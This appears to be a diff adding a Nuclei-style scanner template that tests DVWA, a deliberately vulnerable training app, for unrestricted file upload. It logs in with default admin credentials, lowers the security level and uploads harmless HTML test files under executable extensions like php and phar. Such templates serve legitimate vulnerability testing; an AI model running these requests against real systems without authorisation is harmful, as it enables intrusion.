@@ -1,0 +1,112 @@
+id: dvwa-file-upload-low-sec 
+
+info:
+  name: DVWA Local File Upload - low sec (Authenticated)
+  author: Shieldia
+  severity: high
+  description: Attempts to exploit unfiltered file upload on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,auth,upload,file-upload
+
+variables:
+  password: "password"
+  username: "admin"
+  file_exts:
+    - "phar"
+    - "php"
+    - "php3"
+    - "php4"
+    - "php5"
+    - "phtml"
+    - "txt"
+    - "gz"
+    - "tar"
+    - "tar.gz"
+    - "tgz"
+    - "doc"
+    - "docx"
+    - "xls"
+    - "xlsx"
+    - "conf"
+
+flow: |
+  http(1) && http(2);
+  for (let file_ext of iterate(template["file_exts"])) {
+    set("file_ext", file_ext);
+    http(3);
+  }
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to Low
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=low&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Execute The File Uploads
+  - raw:
+      - |
+        POST /DVWA/vulnerabilities/upload/ HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+        100000
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="uploaded"; filename="{{rand_text_numeric(10)}}.{{file_ext}}"
+        Content-Type: text/html
+
+        <h1>File Upload Test</h1>
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="Upload"
+
+        Upload
+        ------WebKitFormBoundary--
+
+    matchers:
+      - type: word
+        words:
+          - "succesfully uploaded"  # Adjust based on actual response
+
+    extractors:
+      - type: regex
+        group: 1
+        name: file_name
+        regex:
+          - "./../hackable/uploads/([0-9]{10}.*) succesfully"
